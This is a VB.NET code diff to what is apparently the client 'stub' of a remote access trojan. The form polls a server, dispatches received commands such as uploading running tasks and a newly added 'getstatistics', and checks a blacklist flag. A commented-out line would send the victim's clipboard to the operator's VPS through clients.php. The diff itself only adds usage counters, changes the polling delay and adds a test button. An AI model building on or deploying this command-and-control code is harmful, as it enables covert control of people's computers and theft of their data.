@@ -79,6 +79,7 @@ Public Class MainForm
         )
 
         upTime += 1
+        My.Settings.stats_total_uptime = My.Settings.stats_total_uptime + 1 : My.Settings.Save()
         Return apiResponse
     End Function
 
@@ -91,7 +92,7 @@ Public Class MainForm
                 Dim actionContent As String() = parsedResponse.Skip(1).ToArray
                 parseAction(actionType, actionContent)
             End If
-            Thread.Sleep(500)
+            Thread.Sleep(1000)
         End While
     End Sub
 
@@ -99,6 +100,7 @@ Public Class MainForm
         'My.Settings.bl = False
         'My.Settings.blmsg = ""
         'My.Settings.Save()
+        My.Settings.stats_total_initialisation = My.Settings.stats_total_initialisation + 1 : My.Settings.Save()
 
         If My.Settings.bl Then
             If My.Settings.blmsg.Trim <> "" Then
@@ -122,6 +124,8 @@ Public Class MainForm
     End Sub
 
     Private Sub parseAction(actionType As String, actionContent As String())
+        My.Settings.stats_total_instruction = My.Settings.stats_total_instruction + 1 : My.Settings.Save()
+
 #Region "System"
 
         ' TODO: Should we put these four on the extractor rather than in the stub ?
@@ -171,22 +175,19 @@ Public Class MainForm
             ' TODO : check this feature
             IndependantActions.UploadRunningTasks(mainWebClient)
 
+        ElseIf actionType = "getstatistics" Then
+            IndependantActions.GetStatistics(mainWebClient)
+
         ElseIf actionType = "getclipboard" Then
             ' TODO : make getclipboard
-
             ' Dim clipboardContent As String = "[Nothing]"
-
             'If Clipboard.ContainsImage Or Clipboard.ContainsFileDropList Or Clipboard.ContainsAudio Then
             '   clipboardContent = "[Clipboard contains one or multiple images, files or audios]"
             'ElseIf Clipboard.ContainsText(textdataformat.text) Then
             '   clipboardContent = Clipboard.GetText()
             'End If
-
-
             ' MsgBox("sent " & Clipboard.GetText(TextDataFormat.UnicodeText))
-            ' ok
-            ' sois attentif regazrde
-            '  mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendclipboard&actioncontent=" & clipboardContent)
+            ' mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendclipboard&actioncontent=" & clipboardContent)
         End If
 
 #End Region
@@ -237,5 +238,9 @@ Public Class MainForm
             File.Move(filename, Path.GetTempPath & filename)
         End If
 #End Region
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        PictureBox1.BackColor = Color.Blue
     End Sub
 End Class
